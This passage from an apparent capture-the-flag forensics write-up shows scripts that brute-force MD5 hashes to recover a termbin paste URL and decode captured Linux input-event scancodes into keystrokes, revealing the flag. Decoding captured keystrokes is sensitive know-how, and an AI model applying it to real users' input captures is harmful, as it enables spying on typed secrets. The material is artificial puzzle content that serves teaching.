print("Found a total of " + str(len(hashes)) + " hashes")

print("Searching for all possible hashes")
for c1, c2, c3, c4 in tqdm(itertools.product(string.printable, string.printable, string.printable, string.printable)):
    link = (c1 + c2 + c3 + c4).encode('ascii')
    hashed_link = hashlib.md5(link).hexdigest()[::-1]
    x = find(hashes, hashed_link)
    if x == hashed_link:
        print("")
        print("Found a correct hash: " + hashed_link)
        print("Terminfo url: https://termbin.com/" + link.decode('ascii'))
        break
```

The output of the script is:
```
$ python3 hash_finder.py
Opening file
Finding hashes
Found a total of 119182 hashes
Searching for all possible hashes
31052456it [04:12, 118562.92it/s]
Found a correct hash: 0bb3dfada523c1a14c3224849368e9ff
Terminfo url: https://termbin.com/v61x
```

And we find the termbin url that the scancodes are uploaded to! It's https://termbin.com/v61x.
This is really the part that gave me the most trouble.
At the end, when I was close to giving up, I finally just read [the actual documentation](https://www.kernel.org/doc/Documentation/input/input.txt), and came up with the following script.
This was the last thing I wrote, and therefore also the ugliest.
```python
import struct

code_dict_shift = {0x10: 'Q', 0x11: 'W', 0x12: 'E', 0x13: 'R', 0x14: 'T', 0x15: 'Y', 0x16: 'U', 0x17: 'I', 0x18: 'O', 0x19: 'P', 0x1E: 'A', 0x1F: 'S', 0x20: 'D', 0x21: 'F', 0x22: 'G', 0x23: 'H', 0x24: 'J', 0x25: 'K', 0x26: 'L', 0x2C: 'Z', 0x2D: 'X', 0x2E: 'C', 0x2f: 'V', 0x30: 'B', 0x31: 'N', 0x32: 'M', 0x02: '!', 0x03: '@', 0x04: '#', 0x05: '$', 0x06: '%', 0x07: '^', 0x08: '&', 0x09: '*', 0x0a: '(', 0x0b: ')', 0x0c: '_', 0x1A: '{', 0x1b: '}', 0x34: '', 0x39: ' ', 0x1c: '\n', 0: ''}
code_dict = {0x10: 'q', 0x11: 'w', 0x12: 'e', 0x13: 'r', 0x14: 't', 0x15: 'y', 0x16: 'u', 0x17: 'i', 0x18: 'o', 0x19: 'p', 0x1E: 'a', 0x1F: 's', 0x20: 'd', 0x21: 'f', 0x22: 'g', 0x23: 'h', 0x24: 'j', 0x25: 'k', 0x26: 'l', 0x2C: 'z', 0x2D: 'x', 0x2E: 'c', 0x2f: 'v', 0x30: 'b', 0x31: 'n', 0x32: 'm', 0x02: '1', 0x03: '2', 0x04: '3', 0x05: '4', 0x06: '5', 0x07: '6', 0x08: '7', 0x09: '8', 0x0a: '9', 0x0b: '0', 0x0c: '-', 0x1A: '[', 0x1b: ']', 0x39: ' ', 0x34: '', 0x1c: '\n', 0: ''}


scancodes = open('scancodes.txt', 'r').read()
output = []
lshift = False
rshift = False
while len(scancodes) > 47:
    (tv_sec, tv_usec, type, code, value)  = struct.unpack('llHHI', bytes.fromhex(scancodes[:48]))
    scancodes = scancodes[48:]
    if type != 1:
        continue
    k = ""
    if code == 42:
        if value == 1 or value == 2:
            lshift = True
        else:
            lshift = False
        continue
    if code == 0x36:
        if value == 1 or value == 2:
            rshift = True
        else:
            rshift = False
        continue


    if value == 1:
        if lshift or rshift:
            output.append(code_dict_shift[code])
            k = code_dict[code]
        else:
            output.append(code_dict[code])
            k = code_dict[code]
print(''.join(output))
```

The result of this script:

>I have all the data needed for the heist Trevor can handle the guns and Franklin will be on the getaway vehicle It feels good to say that inctf{th1s_1s_the_b1g_oNe_lester}
